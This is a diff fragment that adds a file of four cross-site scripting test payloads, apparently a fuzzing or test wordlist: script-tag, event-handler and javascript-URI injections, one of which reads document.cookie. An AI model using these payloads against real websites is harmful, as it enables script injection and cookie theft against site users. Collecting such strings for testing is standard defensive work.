@@ -1,0 +1,4 @@
+<script>alert(1)</script>
+"><img src=x onerror=prompt(1)>
+' autofocus onfocus=alert(1)
+javascript:alert(document.cookie)
